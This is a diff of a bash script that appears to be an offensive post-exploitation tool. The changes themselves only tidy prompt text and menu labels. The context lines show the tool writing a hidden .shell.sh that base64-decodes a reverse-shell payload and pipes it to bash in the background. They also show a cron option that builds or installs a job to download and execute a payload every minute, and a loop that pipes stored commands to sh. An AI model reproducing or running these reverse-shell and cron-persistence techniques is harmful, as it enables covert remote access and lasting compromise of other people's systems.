@@ -35,7 +35,7 @@ function genpayload() {
 				echo "nohup echo \"${encode}\" | base64 -d | bash &" > .shell.sh
 				chmod +x .shell.sh
 				echo -e "Payload saved as `pwd`/.shell.sh"
-				read -p "Press enter to continue"
+				read -p "Press enter to continue "
 		}
 
 		PS3="Select Reverse Shell payload: "
@@ -92,22 +92,22 @@ function cron() {
 				echo -e "command:"
 				cat command.txt
 				echo -e "\n"
-				read -p "Press enter to continue"
+				read -p "Press enter to continue "
 		}
 
 		function add2sys() {
 		
 				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
 				echo -e "\nAdded cron job to crontab\n"
-				read -p "Press enter to continue"
+				read -p "Press enter to continue "
 
 		}
 		PS3="Generate cron job payload dropper command or add cron job to this machine: "
-		options=("Generate crontab command to download and payload every minute" "Add cronjob to this system to download and execute payload every minute"  "Return to  main menu")
+		options=("Generate crontab command to download and payload every minute" "Add cron job to this system to download and execute every minute" "Return to main menu")
 		select opt in "${options[@]}"
 		do
 			case $opt in
-				"Generate crontab command to download payload every minute")
+				"Generate crontab command to download and payload every minute")
 					command
 					;;
 				"Add cron job to this system to download and execute every minute")
@@ -200,7 +200,7 @@ function info() {
 		do
 			echo ${post[$i-1]} | sh || true
 		done
-		read -p "Press enter to continue"
+		read -p "Press enter to continue "
 		clear
 		return 1
 
